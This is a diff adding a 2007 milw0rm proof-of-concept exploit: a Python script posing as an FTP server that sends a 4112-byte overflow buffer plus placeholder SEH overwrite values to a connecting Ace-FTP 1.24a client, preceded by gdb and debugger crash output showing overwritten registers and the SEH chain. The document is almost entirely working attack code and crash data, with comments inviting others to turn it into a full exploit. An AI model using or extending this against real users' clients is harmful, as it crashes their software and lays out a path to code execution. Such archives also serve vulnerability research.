@@ -1,0 +1,121 @@
+#!/usr/bin/python
+#######################################################################
+#Credit to n00b for finding the bug.
+#Ace-Ftp client buffer over flow p0c.
+#This is possible to exploit as we 
+#Smash the seh handlers and there are
+#Plenty of registers that had our buffer
+#Im still new to seh over writes I haven't 
+#Had much experience with the seh over write
+#But get the Idea from what I've read about
+#It..Any way this script creates a listening 
+#Socket and act's as a ftp server then when the 
+#Client connect's a huge buffer is sent back to
+#The client.Resulting and a buffer overflow.
+#If any one feel's like investigating or writing
+#A poc for this please do so give some credits to 
+#n00b.I will give it a try during the week.
+#######################################################################
+#Shouts: - Str0ke - Marsu - SM - vade79 - c0ntex - Kevin Finisterre
+#######################################################################
+#Tested:Win xp sp2.
+#Version Affected: v1.24a.
+###################################################
+#               \\Debug info//
+###################################################
+#Program received signal SIGSEGV,Segmentation fault.
+#[Switching to thread 1312.0x714]
+#0x00403c58 in ?? ()
+#
+#(gdb) i r
+#
+#eax            0x41414141       1094795585  <----Eax over written..
+#ecx            0x0      0
+#edx            0xa5b464 10859620
+#ebx            0x41414141       1094795585  <----Ebx over written..
+#esp            0x12e458 0x12e458
+#ebp            0x12f48c 0x12f48c
+#esi            0x12e488 1238152
+#edi            0xa5b464 10859620
+#eip            0x403c58 0x403c58
+#eflags         0x10206  66054
+#cs             0x1b     27
+#ss             0x23     35
+#ds             0x23     35
+#es             0x23     35
+#fs             0x3b     59
+#gs             0x0      0
+#fctrl          0xffff1272       -60814
+#fstat          0xffff0000       -65536
+#ftag           0xffffffff       -1
+#fiseg          0x0      0
+#fioff          0x0      0
+#foseg          0xffff0000       -65536
+#fooff          0x0      0
+###################################################
+#What the register look like after crash..
+###################################################
+#EAX 41414141
+#ECX 00000000
+#EDX 00A5D930 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAA
+#EBX 41414141
+#ESP 0012E458
+#EBP 0012F48C ASCII "AAAAAAAAAAAADDDDEEEECCCCCCC
+#ESI 0012E488 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAA
+#EDI 00A5D930 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAA
+#EIP 00403C58 
+###################################################
+#DS:[41414141]=???
+#EDX=00A5D930, (ASCII "AAAAAAAAAAAAAAAAAAAAAAAAA)
+#MOV EDX,DWORD PTR DS:[EAX]
+###################################################
+#SEH chain of main thread
+#Address    SE handler
+#---------------------------
+#0012E46C   AceXFTP.00430B9E
+#45454545
+#---------------------------
+#0012F498   44444444  Pointer to next SEH record
+#0012F49C   45454545  SE handler
+#
+#4112byte's to over write Pointer to next SEH record
+#next 4 bytes over writes se handler.
+###################################################
+
+
+from socket import *
+from struct import pack
+
+host = "127.0.0.1 "
+port = 21
+
+Size_of_buf1  = 4112 
+Size_of_buf2 =  550
+
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind((host, port))
+s.listen(1)
+print "\nPort %d open Waiting !!!! ..." % port
+
+cl, addr = s.accept()
+print "Vic is connected %s" % addr[0]
+
+buf1 =  "A" * Size_of_buf1 
+
+NEXT_SEH_RECORD  = "\x44\x44\x44\x44"
+
+SE_HANDLER       = "\x45\x45\x45\x45" 
+
+buf2  = "C" * Size_of_buf2
+
+End  = "\r\n" 
+
+cl.send(buf1 + NEXT_SEH_RECORD + SE_HANDLER + buf2 + End)
+print "mission accomplished : OK\n"
+
+sleep(3)
+cl.close()
+s.close()
+
+# milw0rm.com [2007-06-10]
